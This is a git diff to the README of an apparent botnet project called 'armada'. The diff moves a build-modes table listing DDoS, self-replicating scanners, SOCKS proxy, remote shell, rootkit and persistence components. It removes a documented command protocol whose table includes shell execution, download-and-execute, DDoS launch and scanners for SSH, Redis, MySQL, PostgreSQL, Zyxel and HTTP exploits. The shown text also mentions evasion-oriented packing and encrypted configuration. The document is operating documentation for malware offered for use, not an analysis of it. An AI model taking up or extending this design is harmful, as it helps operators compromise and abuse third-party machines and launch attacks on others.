@@ -18,6 +18,17 @@
 > - VT Threat Report
 ---
 
+## Build Modes
+
+| Mode | Flags | Size | Includes |
+|------|-------|------|----------|
+| **Full** | *(none)* | ~120KB | DDoS + scanners + SOCKS + shell + rootkit + persist |
+| **No Attack** | `NO_ATTACK=1` | ~100KB | Scanners + SOCKS + shell + rootkit + persist |
+| **No Selfrep** | `NO_SELFREP=1` | ~105KB | DDoS + SOCKS + shell + rootkit + persist |
+| **Minimal** | Both flags | ~80KB | SOCKS + shell + rootkit + persist |
+
+---
+
 ## Setup
 
 ```bash
@@ -264,39 +275,6 @@ Static-linked, stripped, packed with **m30w** (custom UPX fork -- zero UPX finge
   Plaintext --> ChaCha20-Poly1305 AEAD (key2) --> AES-256-CTR (key1) --> hex --> config.c
 ```
 
-### Command Frame
-
-```
-  +------+----------+------------+------------------+
-  | 0xFF | cmd_id   | arg_len    | args             |
-  | (1B) | (1B)     | (2B, BE)   | (N bytes)        |
-  +------+----------+------------+------------------+
-```
-
-### Command Table
-
-| ID | Command | Description |
-|----|---------|-------------|
-| `0x01` | `!shell` | Blocking shell execution |
-| `0x02` | `!stream` | Real-time streaming exec |
-| `0x03` | `!detach` | Background/daemon exec |
-| `0x04` | `!info` | System info query |
-| `0x05` | `!socks` | Start SOCKS5 proxy |
-| `0x06` | `!stopsocks` | Stop SOCKS5 proxy |
-| `0x0B` | `!attack` | Launch DDoS attack |
-| `0x0C` | `!stopattack` | Stop all attacks |
-| `0x0E` | `!kill` | Self-destruct |
-| `0x14` | `!zyxel` | Zyxel scanner |
-| `0x1C` | `!download` | Download + execute |
-| `0x20` | `!ssh` | SSH scanner |
-| `0x22` | `!http` | HTTP exploit scanner |
-| `0x24` | `!redis` | Redis scanner |
-| `0x26` | `!pgsql` | PostgreSQL scanner |
-| `0x28` | `!mysql` | MySQL scanner |
-| `0x0D` | `!reinstall` | Mass reinstall |
-
----
-
 ## Crypto Stack
 
 | Primitive | Standard | Purpose |
@@ -312,16 +290,6 @@ All implemented in pure C. Zero external libraries. ~600 lines total.
 
 ---
 
-## Build Modes
-
-| Mode | Flags | Size | Includes |
-|------|-------|------|----------|
-| **Full** | *(none)* | ~120KB | DDoS + scanners + SOCKS + shell + rootkit + persist |
-| **No Attack** | `NO_ATTACK=1` | ~100KB | Scanners + SOCKS + shell + rootkit + persist |
-| **No Selfrep** | `NO_SELFREP=1` | ~105KB | DDoS + SOCKS + shell + rootkit + persist |
-| **Minimal** | Both flags | ~80KB | SOCKS + shell + rootkit + persist |
-
----
 
 ## Project Structure
 
@@ -363,7 +331,6 @@ armada/
 +-- setup.py                Interactive setup wizard
 ```
 
-Cause boats needs captains   
 
 ---
 
